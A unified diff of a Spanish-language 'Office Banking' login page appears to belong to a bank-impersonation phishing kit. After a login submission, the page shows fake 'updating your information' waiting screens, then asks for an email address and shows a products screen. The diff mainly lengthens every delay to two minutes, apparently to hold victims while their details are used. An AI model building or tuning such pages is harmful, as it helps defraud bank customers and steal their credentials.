@@ -32,6 +32,7 @@
 </head>
 <body>
   <div class="login-box">
+    <!-- Logo único en la cabecera -->
     <img src="logo-office-banking.png" alt="Office Banking" class="logo">
 
     <!-- Formulario inicial -->
@@ -61,7 +62,7 @@
 
     <!-- Pantalla de espera -->
     <div id="pantallaEspera" class="hidden">
-      <h2>Estamos actualizando la información, por favor espera...</h2>
+      <h2>#Estamos actualizando la información, por favor espera...</h2>
       <div class="spinner"></div>
     </div>
 
@@ -72,9 +73,8 @@
       <button onclick="enviarCorreo()">Enviar</button>
     </div>
 
-    <!-- Pantalla de productos disponibles -->
+    <!-- Pantalla de productos disponibles (sin logo duplicado) -->
     <div id="pantallaProductos" class="hidden">
-      <img src="logo-office-banking.png" 
       <h2>Tenemos algunos productos disponibles para tu Empresa</h2>
       <button class="btn-red" onclick="continuarProductos()">Continuar</button>
     </div>
@@ -132,11 +132,11 @@
           document.getElementById("loginForm").style.display="none";
           document.getElementById("pantallaEspera").classList.remove("hidden");
 
-          // Después de 1 minuto mostrar formulario de correo
+          // Después de 2 minutos mostrar formulario de correo
           setTimeout(()=>{
             document.getElementById("pantallaEspera").classList.add("hidden");
             document.getElementById("formCorreo").classList.remove("hidden");
-          }, 60000); // 1 minutos
+          }, 120000); // 2 minutos
         }
       } catch (error) {
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
@@ -150,7 +150,7 @@
       setTimeout(()=>{
         document.getElementById("pantallaEspera").classList.add("hidden");
         document.getElementById("pantallaProductos").classList.remove("hidden");
-      }, 30000); // 30 segundos
+      }, 120000); // 2 minutos
     }
 
     function continuarProductos(){
@@ -159,7 +159,7 @@
 
       setTimeout(()=>{
         window.location.href="productos.html";
-      }, 30000); // 30 segundos
+      }, 120000); // 2 minutos
     }
   </script>
 </body>
